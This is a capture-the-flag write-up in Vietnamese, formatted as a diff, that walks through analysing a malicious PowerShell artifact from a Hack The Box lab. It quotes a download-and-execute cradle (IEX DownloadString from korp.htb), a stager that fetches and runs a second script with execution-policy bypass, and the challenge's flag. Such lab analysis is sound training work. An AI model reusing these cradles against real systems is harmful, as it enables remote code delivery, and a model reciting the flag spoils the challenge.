@@ -1,0 +1,54 @@
+#CHALLENGE NAME
+Thorin’s Amulet
+Garrick and Thorin’s visit to Stonehelm took an unexpected turn when Thorin’s old rival, Bron Ironfist, challenged him to a forging contest.
+In the end Thorin won the contest with a beautifully engineered clockwork amulet but the victory was marred by an intrusion. 
+Saboteurs stole the amulet and left behind some tracks. 
+Because of that it was possible to retrieve the malicious artifact that was used to start the attack. 
+Can you analyze it and reconstruct what happened? Note: make sure that domain korp.htb resolves to your docker instance IP and also consider the assigned port to interact with the service.
+
+Docker spawned: 94.237.49.252:46564
+
+#recon
+Docker trong challenge này chứa một ứng dụng web hoặc dịch vụ nào đó mà bạn cần điều tra, khai thác, hoặc phân tích để tìm ra flag.
+korp.htb resolves to your docker instance IP: Phải ánh xạ domain korp.htb đến Docker đang chạy. 
+
+tải file zip về giải nén,cat file đã giải nén ra thấy được 1 đoạn có định dạng giống với base64, decode thử thì được lệnh : IEX (New-Object Net.WebClient).DownloadString("http://korp.htb/update").
+qua tìm hiểu lệnh này IEX (Invoke-Expression) để tải và thực thi nội dung từ URL http://korp.htb/update. 
+
+ánh xạ domain korp.htb về IP Docker đã cấp (94.237.49.252).
+Thêm dòng sau vào file hosts của bạn: 94.237.49.252 korp.htb
+Windows: C:\Windows\System32\drivers\etc\hosts
+
+#Exploitation
+sau khi đã ánh xạ thử lên web truy cập trực tiếp vào url [http://korp.htb:46564/update](http://korp.htb:46564/update)Ta sẽ thấy tự động tải xuống được 1 file update.ps1
+Không chơi ngu nên vứt file cho chatGPT đọc trước,chat phân tích thấy được đoạn script như dưới
+function aqFVaq {
+    Invoke-WebRequest -Uri "http://korp.htb/a541a" -Headers @{"X-ST4G3R-KEY"="5337d322906ff18afedc1edc191d325d"} -Method GET -OutFile a541a.ps1
+    powershell.exe -exec Bypass -File "a541a.ps1"
+}
+aqFVaq
+
+*đoạn script này sẽ 
+Tải file a541a.ps1 từ http://korp.htb/a541a
+Chạy file a541a.ps1 ngay sau khi tải về tuy nhiên không ngu gì mà chạy nên ta tiếp tục tìm cách để tải file về từ url đã cho thôi*
+
+Invoke-WebRequest -Uri "http://korp.htb:46564/a541a" `
+  -Headers @{"X-ST4G3R-KEY"="5337d322906ff18afedc1edc191d325d"} `
+  -Method GET `
+  -OutFile "C:\Users\Public\a541a.ps1"
+
+lệnh này sẽ giúp cta tải file từ http://korp.htb:46564/ và lưu vào đường dẫn "C:\Users\Public\a541a.ps1",thử xem qua file bằng notepad trước với lệnh 
+notepad C:\Users\Public\a541a.ps1,ta thu được đoạn script 
+
+$a35 = "4854427b37683052314e5f4834355f346c573459355f3833336e5f344e5f39723334375f314e56336e3730727d" #đặc điểm của mã hex, vì hex chỉ sử dụng 16 ký tự: 0-9 và A-F.
+($a35-split"(..)"|?{$_}|%{[char][convert]::ToInt16($_,16)}) -join ""
+
+*giải thích: dòng 1 của đoạn scipt này đưa ra 1 chuỗi hex,dòng thứ 2 sẽ làm lần lượt trước tiên gộp 2 kí tự làm 1 nhóm |?{$_}| sẽ giúp ta loại bỏ những khoảng trắng sau khi gộp,
+tiếp đến là Chuyển từng cặp ký tự từ hex sang ASCII và cuối cùng gộp lại thành 1 chuỗi với lệnh join ""*
+
+#Flag Extraction
+xác định được file này có vẻ an toàn đánh liều chạy thử thì ra Flag: 
+powershell.exe -ExecutionPolicy Bypass -File C:\Users\Public\a541a.ps1
+*lệnh này sẽ giúp ta chạy được file powershell .ps1 by pass qua quyền thực thi của nó*
+
+HTB{7h0R1N_H45_4lW4Y5_833n_4N_9r347_1NV3n70r} 
